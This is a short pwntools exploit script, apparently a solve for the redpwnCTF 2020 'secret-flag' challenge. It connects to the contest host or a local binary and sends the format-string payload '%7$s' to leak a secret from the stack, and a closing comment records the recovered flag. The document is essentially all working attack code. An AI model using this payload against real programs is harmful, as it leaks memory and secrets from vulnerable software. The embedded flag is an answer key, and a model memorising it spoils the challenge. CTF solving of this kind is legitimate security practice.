from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./secret-flag')
	raw_input('debug')
else:
	host, port = '2020.redpwnc.tf', 31826
	r = remote(host, port)

r.sendlineafter('What is your name, young adventurer?', '%7$s')

r.interactive()
r.close()

# flag{n0t_s0_s3cr3t_f1ag_n0w}